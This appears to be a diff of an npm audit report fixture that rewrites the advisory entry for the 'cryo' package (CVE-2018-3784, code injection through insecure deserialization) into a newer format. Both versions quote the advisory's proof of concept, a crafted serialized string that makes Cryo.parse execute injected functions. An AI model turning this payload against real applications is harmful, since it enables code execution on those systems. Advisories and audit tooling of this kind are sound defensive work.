@@ -5,7 +5,7 @@
       "module": "cryo",
       "resolves": [
         {
-          "id": 1003653,
+          "id": 1039985,
           "path": "cryo",
           "dev": false,
           "bundled": false,
@@ -15,7 +15,7 @@
     }
   ],
   "advisories": {
-    "1003653": {
+    "1039985": {
       "findings": [
         {
           "version": "0.0.6",
@@ -24,37 +24,33 @@
           ]
         }
       ],
-      "id": 1003653,
-      "created": "2018-08-16T19:50:35.895Z",
-      "updated": "2019-06-24T23:04:26.491Z",
-      "deleted": null,
-      "title": "Code Injection",
-      "found_by": {
-        "link": "",
-        "name": "Alexey Tyurin"
-      },
-      "reported_by": {
-        "link": "",
-        "name": "Alexey Tyurin"
-      },
+      "metadata": null,
+      "vulnerable_versions": "<=0.0.6",
       "module_name": "cryo",
+      "severity": "high",
+      "github_advisory_id": "GHSA-38f5-ghc2-fcmv",
       "cves": [
         "CVE-2018-3784"
       ],
-      "vulnerable_versions": ">=0.0.0",
-      "patched_versions": "<0.0.0",
-      "overview": "All versions of `cryo` are vulnerable to code injection due to an Insecure implementation of deserialization.\n\n\n## Proof of concept\n\n```\nvar Cryo = require('cryo');\nvar frozen = '{\"root\":\"_CRYO_REF_3\",\"references\":[{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\"); return 1111;}\"},{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\");return 2222;}\"},{\"contents\":{\"toString\":\"_CRYO_REF_0\",\"valueOf\":\"_CRYO_REF_1\"},\"value\":\"_CRYO_OBJECT_\"},{\"contents\":{\"__proto__\":\"_CRYO_REF_2\"},\"value\":\"_CRYO_OBJECT_\"}]}'\nvar hydrated = Cryo.parse(frozen);\nconsole.log(hydrated);\n```",
-      "recommendation": "No fix is currently available. Consider using an alternative module until a fix is made available.",
-      "references": "- [HackerOne Report](https://hackerone.com/reports/350418)",
       "access": "public",
-      "severity": "high",
-      "cwe": "CWE-502",
-      "metadata": {
-        "module_type": "",
-        "exploitability": 7,
-        "affected_components": ""
+      "patched_versions": "<0.0.0",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
       },
-      "url": "https://npmjs.com/advisories/1003653"
+      "updated": "2020-08-31T18:32:59.000Z",
+      "recommendation": "None",
+      "cwe": "[\"CWE-94\"]",
+      "found_by": null,
+      "deleted": null,
+      "id": 1039985,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2018-3784\n- https://hackerone.com/reports/350418\n- https://github.com/advisories/GHSA-38f5-ghc2-fcmv\n- https://www.npmjs.com/advisories/690",
+      "created": "2022-03-07T18:00:45.442Z",
+      "reported_by": null,
+      "title": "Code Injection in cryo",
+      "npm_advisory_id": null,
+      "overview": "All versions of `cryo` are vulnerable to code injection due to an Insecure implementation of deserialization.\n\n\n## Proof of concept\n\n```\nvar Cryo = require('cryo');\nvar frozen = '{\"root\":\"_CRYO_REF_3\",\"references\":[{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\"); return 1111;}\"},{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\");return 2222;}\"},{\"contents\":{\"toString\":\"_CRYO_REF_0\",\"valueOf\":\"_CRYO_REF_1\"},\"value\":\"_CRYO_OBJECT_\"},{\"contents\":{\"__proto__\":\"_CRYO_REF_2\"},\"value\":\"_CRYO_OBJECT_\"}]}'\nvar hydrated = Cryo.parse(frozen);\nconsole.log(hydrated);\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
+      "url": "https://github.com/advisories/GHSA-38f5-ghc2-fcmv"
     }
   },
   "muted": [],
@@ -71,5 +67,5 @@
     "optionalDependencies": 0,
     "totalDependencies": 1
   },
-  "runId": "d843019c-fef7-4cb8-a317-fb1bee6dfe97"
+  "runId": "1ca937ea-f527-4b76-923c-b9a3ae59273c"
 }
